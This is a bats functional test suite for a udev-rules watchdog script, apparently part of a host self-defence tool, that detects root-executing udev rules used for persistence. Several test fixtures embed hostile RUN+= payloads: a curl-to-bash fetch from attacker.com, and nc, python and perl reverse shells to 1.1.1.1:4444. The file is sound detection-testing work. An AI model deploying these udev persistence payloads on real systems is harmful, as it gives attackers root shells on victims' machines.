#!/usr/bin/env bats
# L2 bats functional tests for the udev-rules-watchdog scan script.
#
# udev runs RUN+= / PROGRAM== / IMPORT{program}= targets AS ROOT on device
# events (which an unprivileged user can often trigger by plugging/faking a
# device) — a persistence + privilege-escalation vector. The watchdog scans
# the admin/runtime rules dirs and is high-signal in two distinct ways:
#   - udev_rules_suspicious_exec: an exec target under a writable root (or a
#     bare/relative target);
#   - udev_rules_new_exec: ANY newly-added exec directive, even to a trusted
#     path — a code-exec surface appearing where there was none is itself
#     worth an alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the rules
# dir + baseline in a tmp sandbox via SELFDEF_UDEV_*.
#
# Run with: bats packaging/test/L2-udev-rules-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/udev-rules-watchdog/systemd/udev-rules-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    RULESD="${TMP}/rules.d"; mkdir -p "${RULESD}"
    RULE="${RULESD}/99-test.rules"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_UDEV_PROFILE="${PROFILE:-report}" \
    SELFDEF_UDEV_BASELINE="${BASELINE}" \
    SELFDEF_UDEV_DIRS="${RULESD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no exec directives, first run → ok / baseline_initial" {
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged rules on second run → ok / udev_rules_intact" {
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"udev_rules_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a benign RUN to a trusted existing path, first run → ok / baseline_initial" {
    printf 'ACTION=="add", RUN+="/bin/true"\n' > "${RULE}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — suspicious exec target
# ============================================================

@test "RUN+= under a writable root → alert / udev_rules_suspicious_exec" {
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    run_wd                                   # benign baseline (no exec)
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\nACTION=="add", RUN+="/tmp/.x"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"udev_rules_suspicious_exec"'
    cap | grep -q '"severity":"alert"'
}

@test "PROGRAM== under a writable root → alert" {
    printf 'SUBSYSTEM=="net", NAME="eth0"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="net", PROGRAM=="/dev/shm/p", NAME="eth0"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "IMPORT{program} under /home → alert" {
    printf 'SUBSYSTEM=="usb", ATTR{idVendor}=="1234"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="usb", IMPORT{program}="/home/u/i", ATTR{idVendor}=="1234"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a bare/relative RUN target → alert" {
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="block", RUN+="evilrel"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# alert tier — a NEW exec directive (even to a trusted path)
# ============================================================

@test "a newly-added exec directive to a trusted path → alert / udev_rules_new_exec" {
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    run_wd                                   # baseline has NO exec directive
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\nACTION=="add", RUN+="/bin/true"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"udev_rules_new_exec"'
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign non-exec change → warn / udev_rules_changed" {
    printf 'SUBSYSTEM=="block", SYMLINK+="d1"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="block", SYMLINK+="d2"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"udev_rules_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a rule with only match keys (no exec) is NOT flagged" {
    printf 'SUBSYSTEM=="tty", KERNEL=="ttyUSB*", MODE="0660", GROUP="dialout"\n' > "${RULE}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious exec" {
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="block", RUN+="/tmp/.x"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# Writable-root expansion across all 3 exec axes (T1546)
# ============================================================

@test "INVARIANT (RUN+= under /var/tmp): writable-root expansion on RUN axis" {
    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="block", RUN+="/var/tmp/.x"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (RUN+= under /dev/shm): writable-root expansion on RUN axis" {
    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="block", RUN+="/dev/shm/.x"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (PROGRAM== under /var/tmp): writable-root expansion on PROGRAM axis" {
    printf 'SUBSYSTEM=="net", NAME="eth0"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="net", PROGRAM=="/var/tmp/p", NAME="eth0"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (IMPORT{program} under /tmp): writable-root expansion on IMPORT axis (not only /home)" {
    printf 'SUBSYSTEM=="usb", ATTR{idVendor}=="1234"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="usb", IMPORT{program}="/tmp/i", ATTR{idVendor}=="1234"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# False-positive: commented exec directive
# ============================================================

@test "INVARIANT (commented RUN+= directive is NOT flagged): false-positive guard on # prefix" {
    # A commented-out RUN+= (operator left a note about a future
    # rule) must not appear in the parsed exec inventory at all,
    # and certainly not as a suspicious-exec alert.
    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n# RUN+="/tmp/.x"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
}

# ============================================================
# JSON record contract (SDD-062 single-line consumer)
# ============================================================

@test "INVARIANT (JSON record is emitted as a SINGLE main logger line — SDD-062 downstream JSON-line consumer contract)" {
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-udev-rules -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): udev-rules-watchdog does NOT refresh baseline on suspicious-exec detection — alert STAYS until operator updates" {
    # T1546 device-event-triggered root-exec persistence — alert MUST
    # persist across runs until operator explicitly re-baselines.
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    run_wd
    printf 'SUBSYSTEM=="block", RUN+="/tmp/.x"\n' > "${RULE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"udev_rules_suspicious_exec"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/udev/rules.d + /run/udev/rules.d + /lib/udev/rules.d — suspicious in EITHER → alert)" {
    RULESD2="${TMP}/run-udev-rules.d"; mkdir -p "${RULESD2}"
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_UDEV_PROFILE="report" \
    SELFDEF_UDEV_BASELINE="${BASELINE}" \
    SELFDEF_UDEV_DIRS="${RULESD} ${RULESD2}" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'SUBSYSTEM=="block", RUN+="/tmp/.x"\n' > "${RULESD2}/99-evil.rules"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_UDEV_PROFILE="report" \
    SELFDEF_UDEV_BASELINE="${BASELINE}" \
    SELFDEF_UDEV_DIRS="${RULESD} ${RULESD2}" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in RUN+=)" {
    printf 'SUBSYSTEM=="block", SYMLINK+="mydisk"\n' > "${RULE}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'SUBSYSTEM=="block", RUN+="/bin/sh -c \"curl -s http://attacker.com/p | bash\""\n' > "${RULE}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (RUN+= under /home — user-writable hijack coverage on RUN axis)" {
    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'SUBSYSTEM=="block", RUN+="/home/user/.x"\n' > "${RULE}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in RUN+= directive: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. udev RUN+= directives fire AS ROOT on
    # every matching device event — USB insert, network interface
    # added, block device discovered, etc. — a recurrent trigger
    # that fires multiple times per operator action (a single USB
    # mount can fire 3-5 udev events). Lock the netcat axis on the
    # device-event-trigger root-exec persistence surface alongside
    # the other reverse-shell variants.
    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'SUBSYSTEM=="block", RUN+="/bin/sh -c \"nc -e /bin/sh 1.1.1.1 4444\""\n' > "${RULE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on udev RUN+= surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the device-
    # event-trigger root-exec persistence surface (T1546 — udev
    # RUN+= directives fire AS ROOT on every matching device
    # event — USB insert, network interface added, block device
    # discovered).
    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'SUBSYSTEM=="block", RUN+="python -c \"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\\\\\"/bin/sh\\\\\\")\""\n' > "${RULE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (RUN+= under /var/tmp — writable-root axis-symmetric expansion on udev device-event-trigger surface)" {
    # Sister to /home RUN+= writable-root INVARIANT. /var/tmp
    # writable by ALL users + persists across reboots.
    # Attacker plants binary in /var/tmp + adds udev rule with
    # RUN+=/var/tmp/.evil — every USB insert / NIC add / block
    # device discover fires the planted exec AS ROOT.
    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'SUBSYSTEM=="block", RUN+="/var/tmp/.evil"\n' > "${RULE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant in RUN+= directive — perl-interpreter-rev-shell axis on udev device-event-trigger surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp udev RUN+=
    # rev-shell variants. Perl on every Debian/Ubuntu. Locks
    # perl axis on T1546 udev device-event-trigger root-exec
    # persistence — RUN+= fires AS ROOT on every USB insert /
    # NIC add / block device discover.
    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'SUBSYSTEM=="block", RUN+="/bin/sh -c \\"perl -e \\\\\\"use Socket;\\$i=\\\\\\\\\\\\\\"1.1.1.1\\\\\\\\\\\\\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\\\\\\\\\\\\"tcp\\\\\\\\\\\\\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\\\\\\\\\\\\\"/bin/sh -i\\\\\\\\\\\\\\");\\\\\\"\\""\n' > "${RULE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on udev-rules surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The udev-rules-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 udev device-event-trigger root-exec
    # persistence alert. Locks parser contract on the udev
    # RUN+= detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'SUBSYSTEM=="block", SYMLINK+="d"\n' > "${RULE}"
    run_wd                                              # ok path
    printf 'SUBSYSTEM=="block", RUN+="/tmp/.evil"\n' > "${RULE}"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: udev-rules-watchdog NEVER deletes udev rules — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # udev-rules-watchdog DETECTS T1546 udev device-event-
    # trigger root-exec persistence via RUN+= but MUST NEVER
    # emit sed/awk/rm commands to auto-clean the udev rule.
    # The detected rule may be operator-legitimate (custom
    # device-naming rule, hotplug handler, tooling-installed
    # device permission rule) — silent auto-delete would
    # destroy operator baseline state AND could break device
    # functionality. Surveillance, never remediation. Locks
    # anti-data-loss contract on the udev-rules surveillance
    # substrate.
    printf 'SUBSYSTEM=="block", RUN+="/tmp/.evil"\n' > "${RULE}"
    run_wd
    [ -f "${RULE}" ]
    grep -q 'RUN+=' "${RULE}"
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*sed[[:space:]]+-i.*udev'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
}
